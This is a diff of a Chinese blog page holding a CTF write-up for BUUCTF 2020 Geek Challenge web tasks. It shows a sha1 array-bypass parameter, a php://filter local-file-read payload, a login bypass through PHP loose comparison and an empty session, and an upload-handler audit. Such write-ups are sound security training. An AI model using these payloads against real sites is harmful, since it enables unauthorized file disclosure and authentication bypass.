@@ -1,608 +1,259 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF-2020极客大挑战 | Virtua1</title><meta name="keywords" content="buuctf,Writeup"><meta name="author" content="Virtua1"><meta name="copyright" content="Virtua1"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="BUUCTF-2020极客大挑战[WEB]Welcome题目访问不了，bp抓包，响应头显示：  改为post请求：  数组绕过sha1：roam1[]&#x3D;1&amp;roam2[]&#x3D;2 phpinfo()页面搜索flag：  [WEB]myblog打开题目看到url，猜测存在伪协议读取文件，没有读到index 读到了login.php： 1?page&#x3D;php:&#x2F;&#x2F;fil">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-2020极客大挑战">
+<meta property="og:url" content="https://v1sun.github.io/2021/04/21/BUUCTF-2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/index.html">
+<meta property="og:site_name" content="Virtua1">
+<meta property="og:description" content="BUUCTF-2020极客大挑战[WEB]Welcome题目访问不了，bp抓包，响应头显示：  改为post请求：  数组绕过sha1：roam1[]&#x3D;1&amp;roam2[]&#x3D;2 phpinfo()页面搜索flag：  [WEB]myblog打开题目看到url，猜测存在伪协议读取文件，没有读到index 读到了login.php： 1?page&#x3D;php:&#x2F;&#x2F;fil">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/virtua1/note_pictures/raw/master/20210502232517.png">
+<meta property="article:published_time" content="2021-04-21T12:15:00.000Z">
+<meta property="article:modified_time" content="2021-05-02T15:25:47.833Z">
+<meta property="article:author" content="Virtua1">
+<meta property="article:tag" content="buuctf">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/virtua1/note_pictures/raw/master/20210502232517.png"><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://v1sun.github.io/2021/04/21/BUUCTF-2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-05-02 23:25:47'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-<!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
 
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
 
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg">
-  <link rel="icon" href="/img/avatar.jpg">
-  <meta name="viewport"
-        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
   
-  <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="">
-  <meta name="author" content="Virtua1">
-  <meta name="keywords" content="">
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
   
-  <title>BUUCTF-2020极客大挑战 - Virtua1</title>
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
-
-
-  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
-  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
-
-  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
     
-    
-      
-      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
-    
-  
-
-  
-    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
-  
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-<!-- 自定义样式保持在最底部 -->
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"v1sun.github.io","root":"/","version":"1.8.9-a","typing":{"enable":true,"typeSpeed":80,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Virtua1" type="application/atom+xml">
-</head>
-
-
-<body>
-  <header style="height: 70vh;">
-    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand"
-       href="/">&nbsp;<strong>Virtua1's Space</strong>&nbsp;</a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
-                class="iconfont icon-search"></i>&nbsp;</a>
-          </li>
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" href="javascript:">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-</nav>
-
-    <div class="banner" id="banner" parallax=true
-         style="background: url('https://gitee.com/virtua1/note_pictures/raw/master/20210418214331.webp') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
-        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-          <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="BUUCTF-2020极客大挑战">
-              
-            </span>
-
-            
-              <div class="mt-3">
-  
-  
-    <span class="post-meta">
-      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-04-21 20:15" pubdate>
-        2021年4月21日 晚上
-      </time>
-    </span>
-  
-</div>
-
-<div class="mt-1">
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-chart"></i>
-      2.2k 字
-    </span>
-  
-
-  
-    
-    <span class="post-meta mr-2">
-      <i class="iconfont icon-clock-fill"></i>
-      
-      
-      33
-       分钟
-    </span>
-  
-
-  
-  
-</div>
-
-            
-          </div>
-
-          
-        </div>
-      </div>
-    </div>
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="d-none d-lg-block col-lg-2"></div>
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div class="py-5" id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">BUUCTF-2020极客大挑战</h1>
-            
-            <div class="markdown-body">
-              <h2 id="BUUCTF-2020极客大挑战"><a href="#BUUCTF-2020极客大挑战" class="headerlink" title="BUUCTF-2020极客大挑战"></a>BUUCTF-2020极客大挑战</h2><h3 id="WEB-Welcome"><a href="#WEB-Welcome" class="headerlink" title="[WEB]Welcome"></a>[WEB]Welcome</h3><p>题目访问不了，bp抓包，响应头显示：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420165004.png" srcset="/img/loading.gif" lazyload alt="image-20210420165004101"></p>
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Virtua1" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Virtua1</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">BUUCTF-2020极客大挑战</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-21T12:15:00.000Z" title="发表于 2021-04-21 20:15:00">2021-04-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-05-02T15:25:47.833Z" title="更新于 2021-05-02 23:25:47">2021-05-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="BUUCTF-2020极客大挑战"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div><article class="post-content" id="article-container"><h2 id="BUUCTF-2020极客大挑战"><a href="#BUUCTF-2020极客大挑战" class="headerlink" title="BUUCTF-2020极客大挑战"></a>BUUCTF-2020极客大挑战</h2><h3 id="WEB-Welcome"><a href="#WEB-Welcome" class="headerlink" title="[WEB]Welcome"></a>[WEB]Welcome</h3><p>题目访问不了，bp抓包，响应头显示：</p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420165004.png" alt="image-20210420165004101"></p>
 <p>改为post请求：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420165110.png" srcset="/img/loading.gif" lazyload alt="image-20210420165110191"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420165110.png" alt="image-20210420165110191"></p>
 <p>数组绕过sha1：<code>roam1[]=1&amp;roam2[]=2</code></p>
 <p>phpinfo()页面搜索flag：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420165752.png" srcset="/img/loading.gif" lazyload alt="image-20210420165752409"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420165752.png" alt="image-20210420165752409"></p>
 <h3 id="WEB-myblog"><a href="#WEB-myblog" class="headerlink" title="[WEB]myblog"></a>[WEB]myblog</h3><p>打开题目看到url，猜测存在伪协议读取文件，没有读到index 读到了login.php：</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?page=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=login<br></code></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;login</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420170555.png" srcset="/img/loading.gif" lazyload alt="image-20210420170555560"></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//secret.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$secret_seed</span> = mt_rand();<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//login.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;secret.php&quot;</span>);<br>mt_srand(<span class="hljs-variable">$secret_seed</span>);<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = mt_rand();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420170555.png" alt="image-20210420170555560"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//secret.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret_seed</span> = mt_rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line">mt_srand(<span class="variable">$secret_seed</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = mt_rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>看到传入的username&amp;password进入了<code>/?page=admin/user</code>，读取一下：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>session_start();<br><span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))&#123;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>] === <span class="hljs-string">&quot;Longlone&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>] == <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;password&#x27;</span>])&#123;  <span class="hljs-comment">// No one knows my password, including myself</span><br>		<span class="hljs-variable">$logined</span> = <span class="hljs-literal">true</span>;<br>		<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;status&#x27;</span>] = <span class="hljs-variable">$logined</span>;<br>	&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$logined</span> === <span class="hljs-literal">false</span> &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;status&#x27;</span>]) || <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;status&#x27;</span>] !== <span class="hljs-literal">true</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;</span>;<br>	<span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$logined</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&quot;Longlone&quot;</span> <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;  <span class="comment">// No one knows my password, including myself</span></span><br><span class="line">		<span class="variable">$logined</span> = <span class="literal">true</span>;</span><br><span class="line">		<span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] = <span class="variable">$logined</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$logined</span> === <span class="literal">false</span> &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>]) || <span class="variable">$_SESSION</span>[<span class="string">&#x27;status&#x27;</span>] !== <span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>通过关键代码可知用户名为<code>Longlone</code>，密码为随机数验证通过会进入admin目录，可见在验证密码的时候采用<code>==</code> ，我们可以通过清空session 然后密码为空绕过：</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420185859.png" srcset="/img/loading.gif" lazyload alt="image-20210420185859172"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420185859.png" alt="image-20210420185859172"></p>
 <p>成功登陆。</p>
-<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420190000.png" srcset="/img/loading.gif" lazyload alt="image-20210420190000711"></p>
+<p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210420190000.png" alt="image-20210420190000711"></p>
 <p>接下来审计读到的其他代码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;Files&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;status&#x27;</span>] === <span class="hljs-literal">true</span>)&#123;<br>			<span class="hljs-variable">$tmp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>			<span class="hljs-variable">$tmp_path</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>			<span class="hljs-keyword">if</span>((<span class="hljs-variable">$extension</span> = pathinfo(<span class="hljs-variable">$tmp_file</span>)[<span class="hljs-string">&#x27;extension&#x27;</span>]) != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>				<span class="hljs-variable">$allows</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>);<br>				<span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allows</span>,<span class="hljs-literal">true</span>) <span class="hljs-keyword">and</span> in_array(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;Files&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],array_map(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$ext</span></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;image/&#x27;</span>.<span class="hljs-variable">$ext</span>;&#125;,<span class="hljs-variable">$allows</span>),<span class="hljs-literal">true</span>))&#123;<br>						<span class="hljs-variable">$upload_name</span> = sha1(md5(uniqid(microtime(<span class="hljs-literal">true</span>), <span class="hljs-literal">true</span>))).<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$extension</span>;<br>						move_uploaded_file(<span class="hljs-variable">$tmp_path</span>,<span class="hljs-string">&quot;assets/img/upload/&quot;</span>.<span class="hljs-variable">$upload_name</span>);<br>						<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;<br>				&#125; <span class="hljs-keyword">else</span> &#123;<br>					<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \&#x27;gif\&#x27;, \&#x27;jpeg\&#x27;, \&#x27;jpg\&#x27;, \&#x27;png\&#x27; &#x27;) &lt;/script&gt;&quot;</span>;<br>				&#125;<br>			&#125;<br>		&#125;<br>	  <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
